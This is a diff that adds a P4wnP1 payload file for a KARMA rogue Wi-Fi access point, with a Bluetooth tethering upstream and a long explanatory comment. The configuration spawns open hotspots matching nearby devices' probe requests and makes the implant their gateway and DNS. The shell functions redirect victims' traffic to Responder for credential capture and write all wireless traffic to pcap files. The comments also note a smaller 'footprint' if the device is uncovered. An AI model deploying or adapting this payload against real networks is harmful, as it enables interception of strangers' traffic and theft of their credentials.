@@ -1,0 +1,210 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+# Experimental rogue AP payload: using new KARMA modified nexmon firmware to Spawn Open APs
+# =================================================================================================
+#
+# Author: MaMe82
+#
+# The payload brings an OPEN karma enabled rogue Access Point (using a modified nexmon firmware).
+#
+# In contrast to the karma.txt payload, this payload allows Internet upstream via bluetooth BNEP.
+# This has only been tested with an upstream through an Android mobile, because bleutooth
+# tethering has to provided, but P4wnP1 neither PAIRS nor CCONNECTS to the providing device
+# actively.
+#
+# So here are some details on bluetooth upstream (from boot/init_bt.sh):
+# -------------------------------------------------
+#
+# Instead of pairing from P4wnP1 to the device, which provides the NAP, the device
+# has to pair to P4wnP1 and we use the provided NAP afterwards (connect to it and receive an
+# IP configuration via DHCP). This has two advantages:
+#	1) We don't need to interactively handle PASSKEYs or PINs, which would
+#	be the case if pairing is initiated from P4wnP1
+#	2) We don't need to know or discover the MAC of the remote device, as we simply
+#	use the NAP feature of the devices which pairs to us
+#
+# AS NEITHER OF THIS DATA IS REQUIRED, THE FOOTPRINT IS SMALLER IN CASE P4wnP1 GETS
+# UNCOVERED. Additionally we are free to choose how the mobile provides the Internet
+# (2G/3G/4G, WiFi etc.)
+#
+# This is an uncommon approach, as usually the device which provides the NAP
+# (bluetooth tethering) receives the pairing request and after successful pairing
+# it is connected by the remote device which wants to use the Internet connection (P4wnP1 in this case). 
+# Anyway, it is working the other way around and has been tested with to androids, IF THE FOLLOWING POINTS 
+# ARE REGARDED (ANDROID):
+#
+#	0) Pre Step: If P4wnP1 is already in the list of paired devices of the Android phone, it has to
+#	be removed first !!!!
+# 	1) Enable bluetooth on Android
+#	2) Enable bluetooth tethering on Android to provide an Internet connection
+#	3) Instead of waiting for a pairing request, scan for existing bluetooth devices
+#	and pair with "MaMe82-P4wnP1" when found (should be possible when LED blinks 3 times)!!!
+#	4) P4wnP1 allows pairing to everyone (no PIN, no Access Key). The Pairing initiated
+#	from the android phone is combined goes along with a BLUETOOTH CONNECTION ESTABLSIHMENT INITIATED
+#   BY THE ANDROID PHONE. As soon as the bluetooth connection is established, P4wnP1 uses this
+#	to bring up a BNEP connection to the bluetooth Network Access Point (NAP) provided by the
+#	phone (it is a bit like a reverse connection). 
+#	If this succeeds it should be indicated by the phone (the "MaMe82-P4wnP1" device is
+#	highlighted as "connected") and by P4wnP1 (led blinks 5 times, instead of 3 times).
+#	5) On the WiFi end, P4wnP1 opens an open hostpot for every network it sees a probe
+#	request for (KARMA attack). Additionally the network "Free WiFi" is spawned
+#	even if no probe request for another AP is spotted. It should be noted that this happens,
+#	even if there's no bluetooth upstream. As soon as the bluetooth upstream is running,
+#	WiFi stations are able to connect to the Internet (incredible slow, because bluetooth
+#	tethering is a bottleneck - independent of the real Internet connection speed).
+#
+#
+#	Important: Once P4wnP1 is paired with the phone (and thus a known bluetooth device) it isn't 
+#	possible to connect again (after a disconnect). This is because P4wnP1 provides no own bluetooth 
+#	services which could be connected to. 
+#	This essentially means: To bring up the bluetooth PAN upstream again,
+#	P4wnP1 has to be removed from the phone's list of paired devices and the whole procedure has
+#	to be started from scratch. A new pairing request from the phone to P4wnP1, involves the 
+#	establishment of the needed bluetooth connection from the phone to P4wnP1, which is then used to
+#	initiate the network connection from P4wnP1 to the phone. 
+#
+#	Additional note: The logic of the NAP code, doesn't account for disconnects right now.
+#	Thus to re-establih the NAP connection, once lost, P4wnP1 has to be rebooted.
+#
+# In case P4wnP1 is attached to an USB host, it additionally be accessed via USB over Ethernet 
+# (although the payload needs no USB host to work, power supply is sufficient).
+#
+# To sum up: this is a demo for a Karma rogue AP which needs only P4wnP1 and a phone with bluetooth tethering
+# upstream. There is no real attack carried out, but the payload could be extended with common techniques and
+# tools (mitmproxy, sslstrip etc. etc.). I highly suggest the talk "Manna from heaven" talk of Dominic White 
+# and Ian de Villiers for a starting point. 
+# As an example on how to go on from here, P4wnP1 starts captures received WiFi traffic to a PCAP file in the 
+# collected folder (no filesystem sync on power loss). MitM scenarios could easily be applied using iptables
+# redirect rules, as all traffic passes P4wnP1.
+#
+# It is worth mentioning, that this should be used only for testing and to develop a customized karma payload.
+# F.e. P4wnP1's SSH server is reachable for every connected WiFi station and the device providing the bluetooth
+# upstream - DON'T USE IT IN PRODUCTION !
+#
+#
+# hostapd output is logged to /tmp/hostapd.log
+#
+# Creds to: 	Dominic White (singe), Ian de Villiers, Rogan Dawes ... Sensepost
+# ---------		Matthias Schulz, Danie Wegemer + latest nexmon contributors ;-)
+
+
+# =============================
+# General setup
+# =============================
+
+# every option left out defaults to the valur from setup.cfg
+
+USB_VID="0x1D6B"        # Vendor ID
+USB_PID="0x0237"        # Product ID (reuse from network-only, as USB host sees the same device interfaces)
+
+USE_ECM=true            # enable ECM in case the AP should be used with upstream over this channel
+USE_RNDIS=true          # enable RNDIS in case the AP should be used with upstream over this channel
+USE_HID=false           # no keyboard
+USE_RAWHID=false        # no raw HID
+USE_UMS=false           # no USB Mass Storage
+
+ROUTE_SPOOF=false		# no route spoofing, as this referes to ECM/RNDIS
+WPAD_ENTRY=false		# no WPAD over DHCP, as this referes to ECM/RNDIS
+
+
+BLUETOOTH_NAP=false 
+BLUETOOTH_PAN_AUTO=true # try to use the first PAN (bluetooth tethering device) seen, but the remote device has to pair AND CONNECT
+
+WIFI_REG=US
+WIFI_ACCESSPOINT=true
+WIFI_ACCESSPOINT_CHANNEL=6
+WIFI_ACCESSPOINT_NAME="Free WiFi"
+WIFI_ACCESSPOINT_AUTH=false 		# we use an OPEN AP, otherwise the Karma attack wouldn't make too much sense
+WIFI_ACCESSPOINT_PSK="placeholder" 	# not used, because we disabled WPA2 PSK auth
+WIFI_ACCESSPOINT_IP="172.24.0.1" 	# IP used by P4wnP1
+WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
+WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100"	# DHCP Server IP Range
+WIFI_ACCESSPOINT_HIDE_SSID=false	# don't hide ESSID (haven't even tested this for KARMA attack)
+
+WIFI_ACCESSPOINT_DHCP_BE_GATEWAY=true # propagate P4wnP1 as router
+WIFI_ACCESSPOINT_DHCP_BE_DNS=true # don't propagate P4wnP1 as DNS
+WIFI_ACCESSPOINT_DNS_FORWARD=true # Forward incoming DNS requests to nameserver used by P4wnP1 (received via DHCP lease from bluetooth tethering)
+
+WIFI_NEXMON=true # use modified nexmon firmware, to allow an additional monitor interface
+WIFI_NEXMON_BRING_UP_MONITOR_FIRST=true	# we force monitor interface creation before starting hostapd
+
+
+WIFI_ACCESSPOINT_KARMA=true # enables Karma attack with modified nexmon firmware
+WIFI_ACCESSPOINT_KARMA_LOUD=0 # NO EFFECT IN CURRENT FIRMWARE; Send back corresponding beacons only to clients which have sent a probe request (no broadcast of beacons)
+
+									
+AUTOSSH_ENABLED=false # disable AutoSSH reachback, we have no upstream by default
+
+function startResponder()
+{
+	# redirect unicast traffic incoming on wlan0 for every destination to responder (cacth packets sent to our huge subnet ;-) )
+	WIFI_IF="wlan0"
+
+    iptables -t nat -A PREROUTING -i $WIFI_IF -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    iptables -t nat -A PREROUTING -i $WIFI_IF -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+
+	echo "Starting responder..."
+
+	# delete Responder.db
+	rm $wdir/Responder/Responder.db
+
+	# start responder in screen session
+    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $WIFI_IF -d -r -w -P"
+
+	touch /tmp/responder_started
+
+	echo "Responder started."
+	
+}
+
+function onAccessPointUp()
+{
+	# This new callback is triggered when the WiFi the intended SSID is assigned to the WiFi interface (usually when hostapd is up and running)
+	# Warning !! Not tested against configurations with hidden SSID
+	# This is called by user root.
+
+	led_blink 3
+	
+
+	# wait till bnep0 (which is only up if we are connected to a bluetooth Network Access Point (NAP)) received an IP
+	echo "Waiting till the bnep0 interface is up and got an IP"
+	BNEP_HAS_IP=false
+	while ! $BNEP_HAS_IP; do
+		printf "."
+		if (ip a show bnep0 2>/dev/null | grep -q -e "inet "); then 
+			echo "bnep0 received an IP"
+			BNEP_HAS_IP=true
+		else
+			printf "."
+		fi
+	done
+
+	led_blink 4
+
+	# enable kernel IPv4 routing and MASQUERADING on bluetooth bnep0 interface
+	sudo /bin/bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+	sudo iptables -t nat -A POSTROUTING -o bnep0 -j MASQUERADE
+
+	led_blink 5
+	
+	# start dumping traffic on wlan0 to pcap !!Caution, there's no sync when P4wnP1 looses power - file could get corrupted!!
+	NOW=$(date +"%F_%H_%M"); tcpdump -i wlan0 -w $wdir/collected/karma_dump_$NOW.pcap
+	
+}
